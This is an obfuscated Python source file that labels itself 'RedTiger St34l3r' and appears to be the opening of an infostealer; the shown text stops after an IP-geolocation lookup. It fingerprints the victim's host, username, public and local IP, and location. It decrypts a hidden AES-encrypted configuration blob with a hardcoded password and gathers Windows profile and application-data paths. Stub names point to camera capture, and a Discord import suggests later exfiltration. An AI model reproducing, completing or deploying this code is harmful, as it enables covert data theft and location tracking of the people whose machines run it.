
import sys

def HEQLPCIFYDZPOQBWNXTYTBOTXIVPTBXGQOVMINVGDSHDFOJKZJJJVPGLMJYLSBKKWDSVAPMOGLGPFPRVZYOYVDSTYSC():
    def QEFAIFINKSBCKODGDQETSYFJZVDXSPWFZDBVSDXUPLUHUUJHXFYTDQAAAYSGWXYOUGLPJNEJ():
        if sys.platform.startswith("win"):
            return False
        else:
            return True
    
    try: 
        AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ = QEFAIFINKSBCKODGDQETSYFJZVDXSPWFZDBVSDXUPLUHUUJHXFYTDQAAAYSGWXYOUGLPJNEJ()
        if AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ == True:
            return AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ
    except:
        return True
    
if HEQLPCIFYDZPOQBWNXTYTBOTXIVPTBXGQOVMINVGDSHDFOJKZJJJVPGLMJYLSBKKWDSVAPMOGLGPFPRVZYOYVDSTYSC() == True:
    sys.exit()
    
import os
import socket
import win32api
import requests
import base64
import ctypes
import threading
import discord
import zipfile
import io
from json import loads
from urllib.request import urlopen
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

def LPFGWRANZIRLPPONGQTBTSKOBXESXLUBFQSNJSPIMKVRKEXQBBPEMZKCRZCZMKSKBFMZMSLWYPNMZOXPD(DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM): 
    AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_system_info = None
    return AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_system_info

def ZSVIRVMOLUKVAAEDMKIBGHXDNTNQCEBQKJHWKTPTWOKLKAYJOGUEVBHOUBWJLTC(DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM):
    XXWTHWGWDHCIUHKRLCGHBPGXUIZNHUYJLOFYOFWBHSTBZPIISNZVTILAFLGSPNENFGNNOCNSCGKTLADIIZ = None
    return XXWTHWGWDHCIUHKRLCGHBPGXUIZNHUYJLOFYOFWBHSTBZPIISNZVTILAFLGSPNENFGNNOCNSCGKTLADIIZ

def ILNPQPVPIZKLRCBFQFFSHQNUJGUDLFDHIBRBFQAYXBAHCDPOOU(DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM):
    YFEZMISLJMYSWEDZLYCLSTXZUXKOCPQTPFZCEFBJSRTBEYRTGWKZVGGYCBHLVMLWCBOIKKFCBMVEOVYHRXKJFT = None
    return YFEZMISLJMYSWEDZLYCLSTXZUXKOCPQTPFZCEFBJSRTBEYRTGWKZVGGYCBHLVMLWCBOIKKFCBMVEOVYHRXKJFT

def JKDOWBOKGFDIJQUFSCUAAEMBMTVYPWJVRDBBDZOZUPDRTCCIWOH(): 
    PPVCNXKQVKAOWFFKPRVVNRWQBFLRAQCNJVDOEEXOJHEKVWQHZPUNRDRHRCHBZXYGVMPLVCQDXYQXWETBQNXWFGIVSZXDTPN = None
    return PPVCNXKQVKAOWFFKPRVVNRWQBFLRAQCNJVDOEEXOJHEKVWQHZPUNRDRHRCHBZXYGVMPLVCQDXYQXWETBQNXWFGIVSZXDTPN

def BUSAMIABSZBVKTIGXQVLAEDWFNJLQZBZTGOGAXCALUEHYJIKSGFNLTQMYFVZIKMUPB(DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM): 
    DQSEKGAUQVEJFBGYWPFFUGOAZLLKUECQEQRXVDABYRIGISCXFGZLQBNENZOSWIFHJFJWGOUEZEMCYNCLX = None
    FAWAAXTMWEVTLOTLEBHHAQGXIYXZYVMIQDAYQZWKVEGSKGSGTD = None
    VQLXERIPIRMAORMXEUFRKMVDGZRUTMGHOOPWUPNBFEEGURIEAU = None
    UXIJLRJVJNSHZQECWARFRQJWCONJFCKDQMQMAVXRCGJKWMUPAYFXNSIRKAKFLIDSHHKDLOAMS = None
    NLROFAWVCMVAKWQXBJSCJLDSMZJHFRPBHGRMGVNWUBIKJTBXOBWBWPQOVLNSWEORFCBKT = None
    ONTSQMPWCLQTYFECSAZNGMROSZDWQCZORBTHKXODHIIBPLUVPMUWYAGALQQTNWVVERHCIXDYSQCE = None
    return DQSEKGAUQVEJFBGYWPFFUGOAZLLKUECQEQRXVDABYRIGISCXFGZLQBNENZOSWIFHJFJWGOUEZEMCYNCLX, FAWAAXTMWEVTLOTLEBHHAQGXIYXZYVMIQDAYQZWKVEGSKGSGTD, VQLXERIPIRMAORMXEUFRKMVDGZRUTMGHOOPWUPNBFEEGURIEAU, UXIJLRJVJNSHZQECWARFRQJWCONJFCKDQMQMAVXRCGJKWMUPAYFXNSIRKAKFLIDSHHKDLOAMS, NLROFAWVCMVAKWQXBJSCJLDSMZJHFRPBHGRMGVNWUBIKJTBXOBWBWPQOVLNSWEORFCBKT, ONTSQMPWCLQTYFECSAZNGMROSZDWQCZORBTHKXODHIIBPLUVPMUWYAGALQQTNWVVERHCIXDYSQCE

def UWRWVRVIEVCJSSKSVCVTWCRGINPNEHAIRBFWCQBMJDNQSHJTTFDMEZFZWXMJ(DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM):
    HMVVOIQWSMCARDCWOMAOVHXLFQLOOILWVCAMXKHUGHOGVWNNUZEXSQEMAMAQHMXGJBHMBYBRIHEPEOWYBF = None
    QVYOKVNQNTCHBGMPQNVAVHWZFZILDFLCBFYUDFFLSCRNMAYZPUGFLXLSCVACXVNJGBBCPXBIHDYHJVHXGXXORCOXGDZAN = None
    QVMFGUMHZXZFKAMEMEHQZKFVNGUAGYPPZPHNAINKZIQGSWVGZRTDNZWFNAQSNKOMHCFAPZBK = None
    return HMVVOIQWSMCARDCWOMAOVHXLFQLOOILWVCAMXKHUGHOGVWNNUZEXSQEMAMAQHMXGJBHMBYBRIHEPEOWYBF, QVYOKVNQNTCHBGMPQNVAVHWZFZILDFLCBFYUDFFLSCRNMAYZPUGFLXLSCVACXVNJGBBCPXBIHDYHJVHXGXXORCOXGDZAN, QVMFGUMHZXZFKAMEMEHQZKFVNGUAGYPPZPHNAINKZIQGSWVGZRTDNZWFNAQSNKOMHCFAPZBK

def UHSLYCXNYLGFBAJHTERZRJUVRARPNLYGSKMATUDPHMCSJCYDVSSZLGQLRAVZ(DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM):
    AIFDUMXOIWXMNUMJTVIOAYBNBICRYIVAYUWPJTWWBDAXRISPZYPNGSPNOOGCHBCXRNVQLRTNNWLKKVUOZTIUCUGSZMN = None
    return AIFDUMXOIWXMNUMJTVIOAYBNBICRYIVAYUWPJTWWBDAXRISPZYPNGSPNOOGCHBCXRNVQLRTNNWLKKVUOZTIUCUGSZMN

def CWVXPOPHTQOVFZPFJTDIJYCYLNOVKXMAISAPKFSESKYQLBGBIZLMWIMVJXPVLBAFOTRWDKKZS(DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM):
    AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_camera_capture = None
    return AAHOENBMRORNCCSMAQLOSQOTWLMOVTMHCTYGGVTQHPDYXRRWFUIOMORZQGFCLEEWSAZCUYNDQSBMSFWUWVPIBWQRRZ_camera_capture

def ULHLKLXIYVMSLQBLRLWBVLMTVMNIKHMZBDWOWUIIHFOOXXWMLVBXWOUMZAVFLJUCKWQTMTHWBAL(DSBEQAZQJEXLJMJFBQBXTTDJRGUJAEPWDACAFNWCRZBUNJONGSMLCBNWARIJVVJYXWVQEZYCJUCPWVOOFLTUBHMIVYIEQUZDQHCM): 
    HXQWGTFKQZMMTZKVFGVRSTNCJWHNSINQPDEVKDSHOPRFNRAPOLKWCYVNNVOVUWVYZTJXYZGKRQMRNMYYCIFIC = None
    return HXQWGTFKQZMMTZKVFGVRSTNCJWHNSINQPDEVKDSHOPRFNRAPOLKWCYVNNVOVUWVYZTJXYZGKRQMRNMYYCIFIC

def WFAMBECGBOBELQASEWBRWRVAVTWXUWZYLBSULSCMFLGOWJJHTYIHYDPZYSIFALQTJPFFZVXADNCPVBQKDIJF(): pass
def XSYLZFNWTJUDFUXRUEXYUPHSRAWFOVSXSTDMAENEVHTEQACEPLEKBPEMANXWZACYOXXIDCTJOJCLJI(): pass
def JLWDIBNUTQNKBDYSSMYFWUYUZZCEXESGIVTTJNKTQPAJRXHCTPOJJQWMASAUMSVOCQAFTNOWHQCWOUNVLY(): pass
def LTMPRYLGQBHHNALWUFNNSTIWXBHCHTQBPRDUBFIYWMTJMXBYIHCYFATANGUDRZ(): pass
def VTPYICQSXMHGTGFJKLIMBYEHCHYIVLHLGOBGBTROJASLJJBFCJOSSOINDWSJMHKTURNEEZVHFUYUBASUTIXVPNTIHNFU(): pass
def QPTHPNMNEDHBBVLZZYIRIDWHGVOQVHGBVRFQCTPWDZYHIWMVEVKLHNUPNWFIFJNXFUNVKD(): pass
def JAKVUOLDNQAOXHASCRQFVTWAGJPRVALHOCYHCDBSADNIENRUYE(): pass
def VLNBAJAVVCEVQTGQNQFAKNZISNYWWXVFGCZBNLUIYYLPIHVWDMZPB(): pass
def IHEPZTTPQIBZOTCUMTLTUZZRWSPFXXZHDZVGVHANITPZRPSLKLZGL(): pass
def UDCQWQXPWQVYNOUOTQKJOTIRWEQOXFSULGMDBVJEYGOZIYTIOKBZDHRPPHNDXTISRZNKHNLNJCCMIQKZIKCGAZKZZZKSSXIAE(): pass
def MTCGVPZMQQQYKBLPASOYAGDJJAVLHIVGWMFNBFURIWAZNTTJXEGWHZMK(): pass
def IDLLHGDGLQMOCBATVOJMPFLVWODJWECHYVJATKOWYLRUGYROVBQHMICOUNAJPGXRZKWPFLWEHMS(): pass

def NBWWKOVHZLMFGNSSJZSFCYTGJQGMSYMSNOZZQTWWTSWXFBDRBFGYBBROUMHZJOVHNCSOQALKBVIIDVUCKBYSFFYL(title):
    try:
        if sys.platform.startswith("win"):
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        elif sys.platform.startswith("linux"):
            sys.stdout.write(f"\x1b]2;{title}\x07")
    except:
        pass
        
def BHAEIRMAVOXTVJBBVOFCWAUFAUYTVPAMIHWAGRGWLTSVOVJQCKSAVXRECGJLVQWQEBLHDQCDIROQFXBHLJLM():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

def ZDSNZWOYTHNBFKJSWQHPILSTVSBDQXZKAZDMXISTBAHLWBAOKYKIUZMTRLLLENHXGPXDGVCCRSOOCAHBRVFTHMZKL(OHKVSYDAYQVFWXPKYKCJDHDUEIKPGJUIJWSORPPIXRWXHOQXCTWQST, GWRRHPNSIBDVSQQCWTCBYJKFZNBEJRINTCHPSGKAQQBZKBKVMOHZLPSJEMO):
    def TSLSJAQPHYQOLPFYHPLIWRKRYUDZRNFRWHJEPEEINXYDIKIRQXCCLN(UCHHVNFCLHUOLYYESBDKLFQODSICPABEPTKUJGNZYCHYGILOAPSLTXBGWMYCCMLJZORKWVCBZBWRA, MJSNDYINACTQRGWLYAYTHNZRZWZRHBYHGQMAIHECBLSJACLAVHDMRRYBRXWQBMXKHEHLPCMOKOMOZMJONOXQXXFEC):
        HKPKHEXQROOMNVXEEEIQZXYEIHWFNAUATRCQVZGERZZAWPMDQNUGBCWNVMGBKVFEEKPGEVXXBLADWEDIRPXTDDUPJIMNOD = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=MJSNDYINACTQRGWLYAYTHNZRZWZRHBYHGQMAIHECBLSJACLAVHDMRRYBRXWQBMXKHEHLPCMOKOMOZMJONOXQXXFEC, iterations=100000, backend=default_backend())
        if isinstance(UCHHVNFCLHUOLYYESBDKLFQODSICPABEPTKUJGNZYCHYGILOAPSLTXBGWMYCCMLJZORKWVCBZBWRA, str):  
            UCHHVNFCLHUOLYYESBDKLFQODSICPABEPTKUJGNZYCHYGILOAPSLTXBGWMYCCMLJZORKWVCBZBWRA = UCHHVNFCLHUOLYYESBDKLFQODSICPABEPTKUJGNZYCHYGILOAPSLTXBGWMYCCMLJZORKWVCBZBWRA.encode()  
        return HKPKHEXQROOMNVXEEEIQZXYEIHWFNAUATRCQVZGERZZAWPMDQNUGBCWNVMGBKVFEEKPGEVXXBLADWEDIRPXTDDUPJIMNOD.derive(UCHHVNFCLHUOLYYESBDKLFQODSICPABEPTKUJGNZYCHYGILOAPSLTXBGWMYCCMLJZORKWVCBZBWRA)

    OHKVSYDAYQVFWXPKYKCJDHDUEIKPGJUIJWSORPPIXRWXHOQXCTWQST_data = base64.b64decode(OHKVSYDAYQVFWXPKYKCJDHDUEIKPGJUIJWSORPPIXRWXHOQXCTWQST)
    MJSNDYINACTQRGWLYAYTHNZRZWZRHBYHGQMAIHECBLSJACLAVHDMRRYBRXWQBMXKHEHLPCMOKOMOZMJONOXQXXFEC = OHKVSYDAYQVFWXPKYKCJDHDUEIKPGJUIJWSORPPIXRWXHOQXCTWQST_data[:16]
    WCYNCEJVNSLWPHUWNEFQBMCOFWTASEDBDXPKUPCXHSFSOYBZFUEWOQNCCUNEPLNFUKJRCXDIKT = OHKVSYDAYQVFWXPKYKCJDHDUEIKPGJUIJWSORPPIXRWXHOQXCTWQST_data[16:32]
    OHKVSYDAYQVFWXPKYKCJDHDUEIKPGJUIJWSORPPIXRWXHOQXCTWQST_data = OHKVSYDAYQVFWXPKYKCJDHDUEIKPGJUIJWSORPPIXRWXHOQXCTWQST_data[32:]
    HPKUTXABXQVJFIEBXBODFPIJHJPQUWVNNHIARKRJWIAEZYBIPJAAQOMSKNYKSADWPDIJOZOMCIPUNVCGXCCRDAJCB = TSLSJAQPHYQOLPFYHPLIWRKRYUDZRNFRWHJEPEEINXYDIKIRQXCCLN(GWRRHPNSIBDVSQQCWTCBYJKFZNBEJRINTCHPSGKAQQBZKBKVMOHZLPSJEMO, MJSNDYINACTQRGWLYAYTHNZRZWZRHBYHGQMAIHECBLSJACLAVHDMRRYBRXWQBMXKHEHLPCMOKOMOZMJONOXQXXFEC)
    FEHRFYRUREAIUXLKVTQSUDXCFNSAEZAHXABIFLRKDWPOREKMWDUNWYSBLDR = Cipher(algorithms.AES(HPKUTXABXQVJFIEBXBODFPIJHJPQUWVNNHIARKRJWIAEZYBIPJAAQOMSKNYKSADWPDIJOZOMCIPUNVCGXCCRDAJCB), modes.CBC(WCYNCEJVNSLWPHUWNEFQBMCOFWTASEDBDXPKUPCXHSFSOYBZFUEWOQNCCUNEPLNFUKJRCXDIKT), backend=default_backend())
    YGNHKEYVPYXIIHSZCASEZLLKQYYOJVIHPTSUFWOREPAXSZOOWYGMEZMYHOAELDFDLHUI = FEHRFYRUREAIUXLKVTQSUDXCFNSAEZAHXABIFLRKDWPOREKMWDUNWYSBLDR.decryptor()
    IJBNUCVGHUZQHPAGICVKYOYBUEPKMJWFPFMNZHSPDIDSMMQNDTXNJBTREDPMPSRSMWZLBLWZXYCABEP = YGNHKEYVPYXIIHSZCASEZLLKQYYOJVIHPTSUFWOREPAXSZOOWYGMEZMYHOAELDFDLHUI.update(OHKVSYDAYQVFWXPKYKCJDHDUEIKPGJUIJWSORPPIXRWXHOQXCTWQST_data) + YGNHKEYVPYXIIHSZCASEZLLKQYYOJVIHPTSUFWOREPAXSZOOWYGMEZMYHOAELDFDLHUI.finalize()
    KOABZEIKZCRAWZEKNOXISRMXANKMBWDYYNQSQBSVWZWHUFXHFIWBEXFNMXNFMY = padding.PKCS7(128).unpadder()
    LWTMDRPXSRGHCWFMSSVJFEMIVFJPTPKYIQOPLDLPZSGBLEMUAKVFR = KOABZEIKZCRAWZEKNOXISRMXANKMBWDYYNQSQBSVWZWHUFXHFIWBEXFNMXNFMY.update(IJBNUCVGHUZQHPAGICVKYOYBUEPKMJWFPFMNZHSPDIDSMMQNDTXNJBTREDPMPSRSMWZLBLWZXYCABEP) + KOABZEIKZCRAWZEKNOXISRMXANKMBWDYYNQSQBSVWZWHUFXHFIWBEXFNMXNFMY.finalize()
    return LWTMDRPXSRGHCWFMSSVJFEMIVFJPTPKYIQOPLDLPZSGBLEMUAKVFR.decode()

NBWWKOVHZLMFGNSSJZSFCYTGJQGMSYMSNOZZQTWWTSWXFBDRBFGYBBROUMHZJOVHNCSOQALKBVIIDVUCKBYSFFYL("")

try: SVALWHBMZPZGKTWIEUUFIYRCLNTPZYYUYTJUURDIKAQGIONLHSPOHGIPRKDZTSEFBIBMXXMTLCMUW    = socket.gethostname()
except: SVALWHBMZPZGKTWIEUUFIYRCLNTPZYYUYTJUURDIKAQGIONLHSPOHGIPRKDZTSEFBIBMXXMTLCMUW = "None"

try: JHRBHNTPAZFVJZKLZFTZJOLALCVZTUDEPBZEGNGKBPIOPOZNRRSBNLOKWSWHRETKLSVGFMAOEVRIQKHKXALXJ    = os.getlogin()
except: JHRBHNTPAZFVJZKLZFTZJOLALCVZTUDEPBZEGNGKBPIOPOZNRRSBNLOKWSWHRETKLSVGFMAOEVRIQKHKXALXJ = "None"

try: IACEFSHGQARRVESHBISUJLYOIFQSMCOFDHHZEKCHHAJTEZSFIRFWCUFIFAMXRIPJPNYFWBAIZCVGFTBSUSUUPOHQUFQHTED    = win32api.GetUserNameEx(win32api.NameDisplay)
except: IACEFSHGQARRVESHBISUJLYOIFQSMCOFDHHZEKCHHAJTEZSFIRFWCUFIFAMXRIPJPNYFWBAIZCVGFTBSUSUUPOHQUFQHTED = "None"

try: TVIPPGRBPOIJUAXNDOAKYCYREAOJOIUYQHULEIOPTOBPVVCMOVNEGQBTPYHYUZMYMDGKFKLAAPTBSZPLVHFFYNHNJOZTJLB    = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: TVIPPGRBPOIJUAXNDOAKYCYREAOJOIUYQHULEIOPTOBPVVCMOVNEGQBTPYHYUZMYMDGKFKLAAPTBSZPLVHFFYNHNJOZTJLB = "None"

try: IJNJRHWBPXVRYQAVAHZQTJDLXJLTLZDLBGJVYEXGTLKPIFBTHBFPPXRAXDUQ    = socket.gethostbyname(socket.gethostname())
except: IJNJRHWBPXVRYQAVAHZQTJDLXJLTLZDLBGJVYEXGTLKPIFBTHBFPPXRAXDUQ = "None"

WLPOOXXAERVCATXYGFUZEPCQITBVCBGBNXMDYSJYUPPKVWGXNN = r"""
9BQV7LkRkdEDBOW/Vilix36Y6l3TECTf1eACAXgq7ZoztvDx/A2E2iixwQl4NPkOlbtb2oPrBm8v54wNVjndf6Ddync9/cOvqTXuOPiLaPvBCpAkhRHV6Y2AnoAZ2mqBiEtfWsiSAPppti0F575UzL97nVFTr20rX7qPiqsJFWjchqeSaWTybJo64YYUCMS5nPbCHzcQ1fijcKAF9M9C4Q==
"""

FRTGZMHQAZQZMLOEUMMRCTXQIEPOOBMIAPJHVQCYPOGPWNDNRHDINCIYCFOBSUSGLQVVVWRQMSGDDHCQYIAW            = "qDmCqcfPUhgwkiwHxbsxWpsnKBWEXDiqgpLXjlnWMVMYZvbToCOdqqycmovfjZlqHTIwXTxweVAwAlJwfpsiCFJowcQnSPAcNZExqOs"
EUZBVERWILCTPCTIDHEFNUXXHZEFOWPXVBQJHXFPQLSMTGHOODFOET        = "None"
TERSYZNSHSJYJYKIBWVSNEGOUYNOLMLHQMXINJLJLWUDKATBGYKKULLSGJZBIIWMSXDT    = 0xa80505
DYCLPVZVUXQZMUOIBAUSSULIRLVZOWGVYADYFCIGSABCFCMCGYZGCQKLGBHTYGHWGEYCLIMBFFYUALNLRIPVNAEDWGUKEEKNN = "RedTiger St34l3r"
BSPTFRPFLBSHSCGICJFUGTCGBYTROBQVURMKJDDNLZTWPTHPWAUWOJRHHAWYIRIXMYLHCCSZ   = "https://google.com"
OYGHCENDOVBGZZPQOHTFAZDNQOCNCUKDCLRKGNEEFNNCFXFZDNVBSHEBDPEVUICBHDTJXBXS    = "RedTiger St34l3r - github.com/loxy0dev/RedTiger-Tools"
POZKDSKVURRDMYNAMMMZEHQYNEXLXELGXHYIBHYZDUPTBYOLTWHVJHONUAOWXHSVWED   = {"text": OYGHCENDOVBGZZPQOHTFAZDNQOCNCUKDCLRKGNEEFNNCFXFZDNVBSHEBDPEVUICBHDTJXBXS, "icon_url": BSPTFRPFLBSHSCGICJFUGTCGBYTROBQVURMKJDDNLZTWPTHPWAUWOJRHHAWYIRIXMYLHCCSZ}
LEJXDUKILCMOUJFBEFRYWOTMYTJVGOFFBMNIGLNCZSVXTRXTJZWQDHUIGGBZWEBGCHECNFFSAJXLTLNFI    = f'`{JHRBHNTPAZFVJZKLZFTZJOLALCVZTUDEPBZEGNGKBPIOPOZNRRSBNLOKWSWHRETKLSVGFMAOEVRIQKHKXALXJ} "{TVIPPGRBPOIJUAXNDOAKYCYREAOJOIUYQHULEIOPTOBPVVCMOVNEGQBTPYHYUZMYMDGKFKLAAPTBSZPLVHFFYNHNJOZTJLB}"`'
BSSWBVSVFPQLDWZMFKXDPUIAIHSKDNIXDKPGMIZFWUWDDIPWHANKVTYBFGFVYNRMWNCAR    = ZDSNZWOYTHNBFKJSWQHPILSTVSBDQXZKAZDMXISTBAHLWBAOKYKIUZMTRLLLENHXGPXDGVCCRSOOCAHBRVFTHMZKL(WLPOOXXAERVCATXYGFUZEPCQITBVCBGBNXMDYSJYUPPKVWGXNN, FRTGZMHQAZQZMLOEUMMRCTXQIEPOOBMIAPJHVQCYPOGPWNDNRHDINCIYCFOBSUSGLQVVVWRQMSGDDHCQYIAW)

YUFIMYHOTROMCYIQLWVABGCNFGBURLVWOCUABDHBPMRXNRRPAHJSTJJNEJOQLWUNLCTMCBNPXQHAXVFFNXIOWTYHATQ           = os.getenv("WINDIR", None)
QGEPVLOWMUORTNOOLSTJLVIDAQANSIPTYGFZGUATLUCJXPJZZBXJHNOREMAGKCBBX       = os.getenv('USERPROFILE', None)
GRITAGXXFKXRZQHLTLFTWTORBCWHBTCTAHXXNYZRIAPEFGTRZPZ     = os.getenv('LOCALAPPDATA', None)
THFDDZUTCHVJUSMHMAEKHZTLNXSTYIVQWBYIZHUUTLAEWCJLDKEZJTUKWHAOASLOLBMMCRVA   = os.getenv('APPDATA', None)
GFUVEDUYCCTPMTRZJAOAIPUDHCRLTRZWOITDHFLWTMDINEHFPZPRYZBQQOATADJADUAQJWKC = os.getenv('ProgramFiles(x86)', None)
if GFUVEDUYCCTPMTRZJAOAIPUDHCRLTRZWOITDHFLWTMDINEHFPZPRYZBQQOATADJADUAQJWKC is None:
    GFUVEDUYCCTPMTRZJAOAIPUDHCRLTRZWOITDHFLWTMDINEHFPZPRYZBQQOATADJADUAQJWKC = os.getenv('ProgramFiles', None)

try:
    RIRORKYORBYWCJZPWBSFXRZCDLYEEGTUDTBHKUUDXGJCTJXKXCRLFBMRQXQJQAJMKUINPZZSGKU = requests.get(f"https://{EUZBVERWILCTPCTIDHEFNUXXHZEFOWPXVBQJHXFPQLSMTGHOODFOET}/api/ip/ip={TVIPPGRBPOIJUAXNDOAKYCYREAOJOIUYQHULEIOPTOBPVVCMOVNEGQBTPYHYUZMYMDGKFKLAAPTBSZPLVHFFYNHNJOZTJLB}")
    IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT = RIRORKYORBYWCJZPWBSFXRZCDLYEEGTUDTBHKUUDXGJCTJXKXCRLFBMRQXQJQAJMKUINPZZSGKU.json()

    SDERCMEGGQSIOKANVXBVZJNYHKIDDMKAMDVMIHPJDBNLMLQSMKTCEKWPJFFZDANGIJLEYKNYA = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('country', "None")
    SDERCMEGGQSIOKANVXBVZJNYHKIDDMKAMDVMIHPJDBNLMLQSMKTCEKWPJFFZDANGIJLEYKNYA_code = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('country_code', "None")
    WLUTMGMFMXEQNANHDJCUSFVQXEMQNTNLUMAMWFYNSEWZPIWQBTIQASXXQWOHDIUOKTPBPCYGFJI = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('region', "None")
    WLUTMGMFMXEQNANHDJCUSFVQXEMQNTNLUMAMWFYNSEWZPIWQBTIQASXXQWOHDIUOKTPBPCYGFJI_code = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('region_code', "None")
    MTISSDZFWNYAXCERMRZCKAKRAOGUGHHSCQBOZXMZASZDHVTOHQPNEBLHKQJHEAORPQHLSSPB = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('zip', "None")
    PNJNDGJWQKFOYXQKFZUORYYNJPBGWCEGWIOLKQICZITAKSSOEHB = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('city', "None")
    LJFQIOVCCCQPZZGKDJPKOYKLZHCKJVDYDADBFVQMGSBEGLMYCPDHWRZXGZAJENHYRJPOQUGHFH = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('latitude', "None")
    UGSICVXWUSHVJHITDDQOLTJNPLEYOKETLZEEDJJBLPJUNFTQXXGPIYZDRNBAWXONFROJUYVOVHIIEOQEW = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('longitude', "None")
    AOWNABHYHTDZPDQTEUUIPKGPALJFGXKQREIALIMVAZJZRDMCYNVDOK = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('timezone', "None")
    YOITRQQPQBXAJWUFLXPJQZPCUXWIVTZKYEVNUPMHLNKQVMEGPVCRTEJORAOINCOY = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('isp', "None")
    VAJQACUMGTMNABPEEBAYXDYBTFCIFENJDDCNBODLNOZGUCUIHEAFIMLEMYXWGPQRQIVHGPR = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('org', "None")
    OUMDXVKKFONDGXGNBZYALLJETDCRAKACGVUNMZLMZQGAQIBSWGFJFDUPUAYSWCYRPO = IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT.get('as', "None")
except:
    RIRORKYORBYWCJZPWBSFXRZCDLYEEGTUDTBHKUUDXGJCTJXKXCRLFBMRQXQJQAJMKUINPZZSGKU = requests.get(f"http://ip-api.com/json/{TVIPPGRBPOIJUAXNDOAKYCYREAOJOIUYQHULEIOPTOBPVVCMOVNEGQBTPYHYUZMYMDGKFKLAAPTBSZPLVHFFYNHNJOZTJLB}")
    IWCGWBRXWBKUPMTUGVRBYHBEPZRWSKMLFBNDUSCMBNSYLMGEMLDXQBONYGMXVQBRQIIDIKPCLAOXWMMAJESOZBT = RIRORKYORBYWCJZPWBSFXRZCDLYEEGTUDTBHKUUDXGJCTJXKXCRLFBMRQXQJQAJMKUINPZZSGKU.json()

